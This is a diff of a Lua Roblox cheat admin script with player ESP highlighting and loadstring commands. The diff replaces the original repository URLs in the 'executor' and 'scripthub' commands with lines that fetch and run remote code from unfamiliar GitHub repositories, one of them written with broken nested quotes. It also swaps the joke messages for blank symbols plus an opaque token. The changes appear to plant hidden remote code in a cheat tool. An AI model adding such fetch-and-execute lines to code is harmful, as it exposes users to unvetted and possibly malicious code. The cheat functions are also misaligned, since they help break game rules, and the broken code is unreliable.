@@ -230,23 +230,23 @@ local msg={
 	"Hola";
 }
 
---[[ Goofy Text ]]--
+--[[ ⁿ² ]]--
 local Goofer={
-	"Egg";
-	"i am a goofy goober";
-	"mmmm lasagna";
-	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-	"i am wondering if i even have a life";
-	"[REDACTED]";
-	"hey guys welcome to another video";
-	"⚠️⚠️⚠️";
-	":-(";
-	"(╯°□°)╯︵ ┻━┻";
-	"freaky";
-	"unreal";
-	"💀💀💀";
-	"X_X";
-	"not bothered to add a message here";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"∅";
+	"nAqwri28dnqpznw8";
 }
 
 --[[ Prediction ]]--
@@ -649,7 +649,7 @@ function ESP(plr)
 			a.Parent=ESPholder
 			a.Adornee=plr.Character
 			a.FillTransparency=0.45
-			a.FillColor=Color3.fromRGB(0,255,0)
+			a.FillColor=Color3.fromRGB(163,28,28) -- Customize Color Here for the Esp
 
 			if plr.Character and plr.Character:FindFirstChild('Head') then
 				local BillboardGui=Instance.new("BillboardGui")
@@ -1221,11 +1221,11 @@ cmd.add({"loadstring","ls"},{"loadstring <code> (ls)","Run the code using the lo
 end)
 
 cmd.add({"executor","exec"},{"executor (exec)","Very simple executor"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NAexecutor.lua"))()
+	loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/XTJZ/Connec/main/git/Connec/t"))()"))()
 end)
 
 cmd.add({"scripthub","hub"},{"scripthub (hub)","Thanks to scriptblox api"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/ScriptHubNA.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/Search"))()
 end)
 
 cmd.add({"stand"},{"stand <player>","Makes a player your stand"},function(...)
